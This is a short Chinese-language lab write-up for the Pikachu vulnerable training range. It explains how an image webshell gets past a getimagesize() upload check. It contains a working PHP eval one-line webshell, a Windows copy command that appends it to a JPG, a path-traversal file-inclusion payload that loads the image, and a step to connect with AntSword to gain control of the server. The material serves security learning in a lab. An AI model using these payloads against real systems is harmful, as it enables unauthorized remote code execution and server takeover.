---
title: Pikachu 文件上传-getimagesize 图片马绕过 Writeup
date: 2026-10-30
category: Web安全
tags: [文件上传,getimagesize,图片马,文件包含,Pikachu]
---
## 一、实验环境
靶场：Pikachu
页面：unsafefileupload/getimagesize.php
漏洞类型：不安全文件上传，getimagesize文件头校验绕过

## 二、漏洞原理
后端使用PHP `getimagesize()` 函数校验上传文件，该函数读取文件二进制头部信息，判断文件是否为合法图片。
该函数仅校验文件头部，不会校验文件后面的内容。攻击者可以制作图片马：在正常图片末尾追加PHP一句话木马。
图片头部满足图片特征，绕过 `getimagesize()` 检测；但图片马本身无法直接执行PHP，**需要搭配文件包含漏洞加载图片马，才能触发代码执行**。

一句话：后端校验文件头，可制作图片马绕过；依赖文件包含完成利用。

## 三、测试payload
一句话木马：
``php
<?php @eval($_POST['cmd']);?>
图片马合成命令（Windows cmd）：
copy test.jpg /b + shell.txt /a shell.jpg
### 利用流程：

1. 准备正常图片test.jpg，准备存放一句话的shell.txt

2. 使用copy命令合成图片马shell.jpg

3. 在本页面上传shell.jpg，成功上传

4. 复制上传后的图片路径，去文件包含页面加载该图片马
文件包含Payload示例：
?filename=../unsafefileupload/upload/shell.jpg
5. 包含成功后，使用蚁剑连接一句话木马，获取服务器权限
